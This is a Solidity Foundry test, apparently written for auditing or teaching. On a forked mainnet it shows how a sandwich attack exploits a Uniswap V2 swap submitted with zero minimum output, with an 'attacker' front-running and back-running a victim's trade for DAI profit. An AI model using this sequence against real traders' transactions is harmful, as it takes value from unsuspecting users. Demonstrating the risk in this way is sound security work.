// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import { IUniswapV2Router02 } from "./interface/IUniswapV2Router02.sol";
import {IERC20 } from "./interface/IERC20.sol";


contract UniswapSlippageTest is Test {
    IUniswapV2Router02 public uniswapRouter02;

    address public DaiHolder = 0x604981db0C06Ea1b37495265EDa4619c8Eb95A3D;// I COPIED ONE OF DAI HOLDERS ADDRESS ON MAINNET
    IERC20 daiToken = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    //alice is the attacker
    //bob innocently sets zero as minAmoutout for swap thereby allowing 100% slippage
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");


    function setUp() public {
        uniswapRouter02 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
    }
    
    receive() external payable {
        console2.log("Thank you friend:", msg.value);
    }

    function test_SlippageBandit() public {

        //Set a variable to hold 100,000 DAI amount.
        uint tokenAmount = 100_000e18;


        // Setting paths for swaps
        address[] memory path = new address[](2);
        address[] memory daiToEthpath = new address[](2);
        path[0] = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);//Dai address on the mainnet
        path[1] = uniswapRouter02.WETH();
        daiToEthpath[0] = uniswapRouter02.WETH();
        daiToEthpath[1] = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);

        // Fund alice and bob with DAI token
        // Alice recieves 200, 000 DAI fund
        // Bob  receives 100_000 DAI
        vm.startPrank(DaiHolder);
        daiToken.transfer(bob, tokenAmount);
        daiToken.transfer(alice, tokenAmount * 2);
        vm.stopPrank();
        
         //Alice's DAI token balance before she sandwich this test contract's swap tx for profit.
         uint beforeProfit = daiToken.balanceOf(alice) / 1e18;
         uint aliceAmount = daiToken.balanceOf(alice);


         /******************************************************
         ** It's alice against bob
         ** At this point alice has a balance of 200,000 DAI token
         ** While bob have 100,000 DAI token
         ** Alice is monitoring the mempool for 0 minAmoutOut swap transactions 
         ** Bob innocently sets minAmoutOut for swap to 0
         ** Alice sees Bobs transaction with zero minAmountOut
         ** Alice decides to front-run bob's transaction by buying ETH first 
         ** so the the price of ETH go up in the pool.
         ** Then alice allows bob to buy ETH at the high price. Now Eth is more expensive so
         ** bob get's lesser ETH than expected from the pool.
         ** After bobs transaction, Alice sends her second transaction to sell of the ETH she 
         ** bought in the first transaction. Now ETH is even more valuable.
         ** Now Alice gets more DAI token profit worth 4,600 DaiHolder
         ** While bob lost some value due because he got less ETH.
         ** Technically Alice stole from Bob's transaction.
         ********************************************************/

         vm.startPrank(alice);
         daiToken.approve(address(uniswapRouter02), type(uint).max);
         uniswapRouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(
             aliceAmount,
             80 ether, //@audit minAmountOutput should be gotten offchain.
             path,
             alice,
             block.timestamp
         );
         vm.stopPrank();

        
        uint aliceEth = address(alice).balance;

        // console2.log("Bot balance during pwning:", address(alice).balance / 1e18);
        uint duringProfit = daiToken.balanceOf(alice) / 1e18;

        // uint daiHolderBalance = daiToken.balanceOf(DaiHolder);
    //     console2.log("This contract's dai",daiToken.balanceOf(address(this))/ 1e18);
    //     console2.log("alice's dai",daiToken.balanceOf(address(alice))/ 1e18);
    //    uint balanceBefore = address(this).balance;


    //Innocents bob sets minAmountOut to zero and got gamed by Alice's transaction above.
        vm.startPrank(bob);
        daiToken.approve(address(uniswapRouter02), type(uint).max);
        uniswapRouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            bob,
            block.timestamp
        );
        vm.stopPrank();
        

        // console2.log("Alice dai balance",aliceAmount/ 1e18);
        
        vm.startPrank(alice);
        daiToken.approve(address(uniswapRouter02), type(uint).max);
        
        uniswapRouter02.swapExactETHForTokensSupportingFeeOnTransferTokens{value: aliceEth}(
            200_000e18 , //@audit min amount based on profit.
            daiToEthpath,
            alice,
            block.timestamp   
        );
        vm.stopPrank();
       

        // console2.log("Bot balance after profit smile:", address(alice).balance/ 1e18);
        uint afterProfit = daiToken.balanceOf(alice) / 1e18;
        console2.log("Alice Before profit:", beforeProfit);
        console2.log("Alice During profit:", duringProfit);
        console2.log("Alice After profit:", afterProfit);
        console2.log("Alice has just made a Big Profit of ",afterProfit - beforeProfit, "DAI from this testContract's lack of slippage protection");
        console2.log("Yippeee", afterProfit - beforeProfit );
        // uint balanceAfter = address(bob).balance;
        // console2.log(daiToken.balanceOf(alice));
        
        // console2.log("Alice ETH", aliceEth/ 1e18);
    }
  
}
